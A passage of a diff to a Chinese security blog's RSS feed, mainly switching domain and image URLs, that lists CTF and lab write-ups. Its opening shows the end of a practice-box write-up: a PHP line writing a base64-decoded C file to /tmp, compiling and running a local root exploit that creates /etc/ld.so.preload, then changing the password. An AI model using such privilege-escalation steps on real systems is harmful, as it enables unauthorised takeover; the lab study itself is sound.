operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603161537874.png&#34; alt=&#34;image-20230603161537874&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php file_put_contents&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/123.c&#34;&lt;/span&gt;,base64_decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;加密内容&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603161537874.png&#34; alt=&#34;image-20230603161537874&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;保存再访问一次首页，返回 kali 成功将文件写入到 &lt;code&gt;/tmp&lt;/code&gt;  下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603161814493.png&#34; alt=&#34;image-20230603161814493&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603161814493.png&#34; alt=&#34;image-20230603161814493&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;然后将文件编译授权运行即可&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;daemon@Kiowizity:/tmp$ gcc &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;.c &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gcc &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;.c &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;daemon@Kiowizity:/tmp$ &lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;.c  tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;daemon@Kiowizity:/tmp$ &lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;777&lt;/span&gt; tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;777&lt;/span&gt; tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;daemon@Kiowizity:/tmp$ ./tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;./tiquan&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;spawning threads&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mount&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mount&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;child threads &lt;span class=&#34;token keyword&#34;&gt;done&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/etc/ld.so.preload created&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;creating shared library&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# whoami&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;whoami&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;passwd&lt;/code&gt;  将密码修改，成功登陆靶机&lt;/p&gt;
 &lt;p&gt;渗透完成&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</guid>
             <title>命令执行(rce)漏洞总结</title>
-            <link>http://k1nako.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</link>
-            <category term="知识点总结补档系列" scheme="http://k1nako.github.io/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E8%A1%A5%E6%A1%A3%E7%B3%BB%E5%88%97/" />
-            <category term="CTF" scheme="http://k1nako.github.io/tags/CTF/" />
+            <link>http://k1nakoo.github.io/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</link>
+            <category term="知识点总结补档系列" scheme="http://k1nakoo.github.io/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E8%A1%A5%E6%A1%A3%E7%B3%BB%E5%88%97/" />
+            <category term="CTF" scheme="http://k1nakoo.github.io/tags/CTF/" />
             <pubDate>Sun, 21 May 2023 20:37:47 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;补档系列&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -869,11 +869,11 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/</guid>
             <title>LitCTF2023部分wp</title>
-            <link>http://k1nako.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/</link>
-            <category term="CTF Write Up" scheme="http://k1nako.github.io/categories/CTF-Write-Up/" />
-            <category term="CTF" scheme="http://k1nako.github.io/tags/CTF/" />
+            <link>http://k1nakoo.github.io/LitCTF2023%E9%83%A8%E5%88%86wp/</link>
+            <category term="CTF Write Up" scheme="http://k1nakoo.github.io/categories/CTF-Write-Up/" />
+            <category term="CTF" scheme="http://k1nakoo.github.io/tags/CTF/" />
             <pubDate>Sat, 13 May 2023 12:45:57 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;LitCTF2023 部分 wp&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -1044,10 +1044,10 @@ sqlmap -u &amp;quot;http://node5.anna.nssctf.cn:28399/?id=id%3D1&amp;quot; -D ct
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/</guid>
             <title>记一次 DVWA 靶场搭建</title>
-            <link>http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/</link>
-            <category term="教程" scheme="http://k1nako.github.io/tags/%E6%95%99%E7%A8%8B/" />
+            <link>http://k1nakoo.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1DVWA%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-%E8%A1%A5%E6%A1%A3/</link>
+            <category term="教程" scheme="http://k1nakoo.github.io/tags/%E6%95%99%E7%A8%8B/" />
             <pubDate>Mon, 24 Apr 2023 22:23:41 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;搭建 DVWA 靶场，补档篇系列&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -1098,11 +1098,11 @@ SQL注入：启动一个“攻击者”将SQL语句注入到HTTP表单的输入�
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
             <title>搭建图床</title>
-            <link>http://k1nako.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
-            <category term="教程" scheme="http://k1nako.github.io/categories/%E6%95%99%E7%A8%8B/" />
-            <category term="教程" scheme="http://k1nako.github.io/tags/%E6%95%99%E7%A8%8B/" />
+            <link>http://k1nakoo.github.io/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
+            <category term="教程" scheme="http://k1nakoo.github.io/categories/%E6%95%99%E7%A8%8B/" />
+            <category term="教程" scheme="http://k1nakoo.github.io/tags/%E6%95%99%E7%A8%8B/" />
             <pubDate>Thu, 20 Apr 2023 23:32:20 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;PicGo + Github + Typora 方式自建图床&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -1134,11 +1134,11 @@ SQL注入：启动一个“攻击者”将SQL语句注入到HTTP表单的输入�
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/</guid>
             <title>第三届红明谷杯web部分wp</title>
-            <link>http://k1nako.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/</link>
-            <category term="CTF Write Up" scheme="http://k1nako.github.io/categories/CTF-Write-Up/" />
-            <category term="CTF" scheme="http://k1nako.github.io/tags/CTF/" />
+            <link>http://k1nakoo.github.io/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb%E9%83%A8%E5%88%86wp/</link>
+            <category term="CTF Write Up" scheme="http://k1nakoo.github.io/categories/CTF-Write-Up/" />
+            <category term="CTF" scheme="http://k1nakoo.github.io/tags/CTF/" />
             <pubDate>Wed, 19 Apr 2023 18:08:53 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;只会点 web 题，还是太菜了&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -1169,10 +1169,10 @@ SQL注入：启动一个“攻击者”将SQL语句注入到HTTP表单的输入�
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/misc%E7%BB%BC%E5%90%88/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/misc%E7%BB%BC%E5%90%88/</guid>
             <title>misc综合</title>
-            <link>http://k1nako.github.io/misc%E7%BB%BC%E5%90%88/</link>
-            <category term="CTF" scheme="http://k1nako.github.io/tags/CTF/" />
+            <link>http://k1nakoo.github.io/misc%E7%BB%BC%E5%90%88/</link>
+            <category term="CTF" scheme="http://k1nakoo.github.io/tags/CTF/" />
             <pubDate>Mon, 17 Apr 2023 22:07:42 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;记录一下我之前做 misc 时碰到的各种工具和小知识&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -1632,11 +1632,11 @@ icmp
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/ctfshow-web/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/ctfshow-web/</guid>
             <title>ctfshow-web</title>
-            <link>http://k1nako.github.io/ctfshow-web/</link>
-            <category term="CTF Write Up" scheme="http://k1nako.github.io/categories/CTF-Write-Up/" />
-            <category term="CTF" scheme="http://k1nako.github.io/tags/CTF/" />
+            <link>http://k1nakoo.github.io/ctfshow-web/</link>
+            <category term="CTF Write Up" scheme="http://k1nakoo.github.io/categories/CTF-Write-Up/" />
+            <category term="CTF" scheme="http://k1nakoo.github.io/tags/CTF/" />
             <pubDate>Mon, 17 Apr 2023 21:40:44 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;ctfshow web 部分 wp&lt;br /&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -2661,9 +2661,9 @@ payload：
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</guid>
             <title>欢迎来到我的博客</title>
-            <link>http://k1nako.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</link>
+            <link>http://k1nakoo.github.io/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</link>
             <pubDate>Sun, 16 Apr 2023 23:14:15 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;&lt;em&gt;&lt;strong&gt;这是一个简单的博客，用来记录我的学习笔记&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
  ]]></description>
